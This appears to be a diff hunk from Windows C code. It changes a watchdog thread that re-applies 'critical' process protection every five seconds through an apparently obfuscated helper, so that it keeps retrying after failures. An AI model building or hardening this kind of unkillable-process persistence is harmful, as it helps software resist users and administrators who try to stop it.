@@ -252,9 +252,11 @@ const char* sys_check_critical_status_with_name(void) {
 /* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
-        /* Continuously re-apply critical protection every 5 seconds.
-           Also does initial protection if not yet attempted. */
-        if (g_critical_protected != -1) {
+        /* Keep retrying until protection succeeds.
+           g_critical_protected == 1  → protected, do nothing
+           g_critical_protected == 0  → not yet attempted, try now
+           g_critical_protected == -1 → previous attempt failed, retry */
+        if (g_critical_protected != 1) {
             obf_sys_protect_process();
         }
         Sleep(5000);
